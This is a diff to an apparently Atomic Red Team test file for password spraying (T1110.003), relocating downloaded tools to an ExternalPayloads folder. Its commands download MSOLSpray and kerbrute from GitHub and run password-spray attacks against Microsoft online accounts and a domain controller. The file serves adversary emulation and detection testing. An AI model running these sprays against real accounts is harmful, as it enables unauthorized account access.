@@ -26,7 +26,7 @@ atomic_tests:
     prereq_command: |
       if not exist %temp%\users.txt (exit /b 1)
     get_prereq_command: |
-      PathToAtomicsFolder\T1110.003\src\parse_net_users.bat
+      "PathToAtomicsFolder\T1110.003\src\parse_net_users.bat"
   executor:
     name: command_prompt
     elevation_required: false
@@ -242,16 +242,17 @@ atomic_tests:
   dependency_executor_name: powershell
   dependencies:
   - description: |
-      MSOLSpray module must exist in $env:temp.
+      MSOLSpray module must exist in PathToAtomicsFolder\..\ExternalPayloads.
     prereq_command: |
-      if (test-path $env:temp\MSOLSpray.ps1){exit 0} else {exit 1}
+      if (test-path "PathToAtomicsFolder\..\ExternalPayloads\MSOLSpray.ps1"){exit 0} else {exit 1}
     get_prereq_command: |
-      invoke-webrequest "https://raw.githubusercontent.com/dafthack/MSOLSpray/922f159104fb3ec77c9fc6507a6388a05c227b5f/MSOLSpray.ps1" -outfile "$env:temp\MSOLSpray.ps1"
+      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+      invoke-webrequest "https://raw.githubusercontent.com/dafthack/MSOLSpray/922f159104fb3ec77c9fc6507a6388a05c227b5f/MSOLSpray.ps1" -outfile "PathToAtomicsFolder\..\ExternalPayloads\MSOLSpray.ps1"
   executor:
     name: powershell
     elevation_required: false
     command: |
-      import-module "$env:temp\MSOLSpray.ps1"
+      import-module "PathToAtomicsFolder\..\ExternalPayloads\MSOLSpray.ps1"
       Invoke-MSOLSpray -UserList "#{user_list}" -Password "#{password}"
 - name: Password Spray using Kerbrute Tool
   auto_generated_guid: c6f25ec3-6475-47a9-b75d-09ac593c5ecb
@@ -271,23 +272,25 @@ atomic_tests:
   dependency_executor_name: powershell
   dependencies:
   - description: |
-      kerbrute.exe must exist in $env:temp
+      kerbrute.exe must exist in PathToAtomicsFolder\..\ExternalPayloads
     prereq_command: |
-      if (test-path $env:temp\kerbrute.exe){exit 0} else {exit 1}
+      if (test-path "PathToAtomicsFolder\..\ExternalPayloads\kerbrute.exe"){exit 0} else {exit 1}
     get_prereq_command: |
-      invoke-webrequest "https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_386.exe" -outfile "$env:temp\kerbrute.exe"
+      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+      invoke-webrequest "https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_386.exe" -outfile "PathToAtomicsFolder\..\ExternalPayloads\kerbrute.exe"
   - description: |
-      passwordspray.txt must exist in $env:temp
+      passwordspray.txt must exist in PathToAtomicsFolder\..\ExternalPayloads
     prereq_command: |
-      if (test-path $env:temp\passwordspray.txt){exit 0} else {exit 1}
+      if (test-path "PathToAtomicsFolder\..\ExternalPayloads\passwordspray.txt"){exit 0} else {exit 1}
     get_prereq_command: |
-      invoke-webrequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.003/src/passwordspray.txt?raw=true" -outfile "$env:temp\passwordspray.txt"
+      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+      invoke-webrequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.003/src/passwordspray.txt?raw=true" -outfile "PathToAtomicsFolder\..\ExternalPayloads\passwordspray.txt"
   executor:
     name: powershell
     elevation_required: false
     command: |
-      cd $env:temp
-      .\kerbrute.exe passwordspray --dc #{domaincontroller} -d #{domain} $env:temp\passwordspray.txt password132 
+      cd "PathToAtomicsFolder\..\ExternalPayloads"
+      .\kerbrute.exe passwordspray --dc #{domaincontroller} -d #{domain} "PathToAtomicsFolder\..\ExternalPayloads\passwordspray.txt" password132 
 - name: AWS - Password Spray an AWS using GoAWSConsoleSpray
   auto_generated_guid: 9c10d16b-20b1-403a-8e67-50ef7117ed4e
   description: |
